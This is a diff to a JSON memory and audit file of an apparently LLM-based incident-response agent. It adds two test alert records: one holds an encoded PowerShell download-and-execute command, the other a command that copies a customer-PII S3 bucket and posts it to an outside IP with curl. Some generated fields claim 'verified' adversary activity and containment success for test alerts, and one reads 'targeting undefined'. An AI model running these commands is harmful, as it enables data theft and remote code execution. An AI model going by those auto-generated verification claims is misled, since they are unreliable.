@@ -1,6 +1,66 @@
 {
   "episodicMemory": [
     {
+      "id": "MEM-EP-2026-823",
+      "timestamp": "2026-09-12T17:53:49.756Z",
+      "title": "Suspicious PowerShell Download and Execution",
+      "enclave": "edr",
+      "alert": {
+        "id": "test-burst-1",
+        "source": "edr",
+        "title": "Suspicious PowerShell Download and Execution",
+        "description": "powershell.exe -enc aWV4IChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQp",
+        "severity": "HIGH",
+        "host": "DESKTOP-TUESDAY",
+        "process": "powershell.exe",
+        "pid": 4820
+      },
+      "rootCause": "Verified adversary activity targeting undefined.",
+      "actionsTaken": [
+        "FW_BLOCK",
+        "PROCESS_TERMINATE",
+        "HOST_ISOLATION"
+      ],
+      "resolutionOutcome": "SUCCESS — Autonomous host containment verified",
+      "mttrSeconds": "43.72",
+      "riskScore": 24,
+      "consensusPct": 0,
+      "engine": "llm",
+      "model": "qwen2.5:7b",
+      "mitreTtps": []
+    },
+    {
+      "id": "MEM-EP-2026-795",
+      "timestamp": "2026-09-12T17:45:48.768Z",
+      "title": "Unauthorized S3 Data Exfiltration & C2 Beaconing",
+      "enclave": "AWS CloudTrail & Host EDR",
+      "alert": {
+        "id": "ALERT-TEST-LIVE",
+        "title": "Unauthorized S3 Data Exfiltration & C2 Beaconing",
+        "source": "AWS CloudTrail & Host EDR",
+        "targetHost": "PROD-DATABASE-01",
+        "ioc": "185.220.101.5:443",
+        "payload": "aws s3 sync s3://prod-customer-pii-vault/ ./stolen_pii/ --quiet && curl -X POST https://185.220.101.5/upload -d @stolen_pii.tar.gz"
+      },
+      "rootCause": "Verified adversary activity targeting PROD-DATABASE-01.",
+      "actionsTaken": [
+        "FW_BLOCK",
+        "PROCESS_TERMINATE",
+        "HOST_ISOLATION"
+      ],
+      "resolutionOutcome": "SUCCESS — Autonomous host containment verified",
+      "mttrSeconds": "17.32",
+      "riskScore": 67,
+      "consensusPct": 50,
+      "engine": "llm",
+      "model": "qwen2.5:7b",
+      "mitreTtps": [
+        "T1071",
+        "T1078",
+        "T1567"
+      ]
+    },
+    {
       "id": "MEM-EP-2026-375",
       "timestamp": "2026-09-12T10:14:35.445Z",
       "title": "Unauthorized Credential Harvester & Outbound Telemetry Siphon",
@@ -469,6 +529,26 @@
   "agentWeights": {},
   "auditLog": [
     {
+      "ts": "2026-09-12T17:53:49.756Z",
+      "type": "INVESTIGATION",
+      "details": "[test-burst-1] CONTAINED in 43.72s, risk 24, engine=llm"
+    },
+    {
+      "ts": "2026-09-12T17:53:06.039Z",
+      "type": "ALERT_INGEST",
+      "details": "[test-burst-1] Suspicious PowerShell Download and Execution from edr"
+    },
+    {
+      "ts": "2026-09-12T17:45:48.768Z",
+      "type": "INVESTIGATION",
+      "details": "[ALERT-TEST-LIVE] CONTAINED in 17.32s, risk 67, engine=llm"
+    },
+    {
+      "ts": "2026-09-12T17:45:31.446Z",
+      "type": "ALERT_INGEST",
+      "details": "[ALERT-TEST-LIVE] Unauthorized S3 Data Exfiltration & C2 Beaconing from AWS CloudTrail & Host EDR"
+    },
+    {
       "ts": "2026-09-12T10:14:35.445Z",
       "type": "INVESTIGATION",
       "details": "[HARVEST-MTY8AHVK] CONTAINED in 0.95s, risk 39, engine=rules"
@@ -855,9 +935,9 @@
     }
   ],
   "stats": {
-    "incidents": 18,
-    "llmRuns": 11,
+    "incidents": 20,
+    "llmRuns": 13,
     "rulesRuns": 7,
-    "totalToolCalls": 144
+    "totalToolCalls": 145
   }
 }
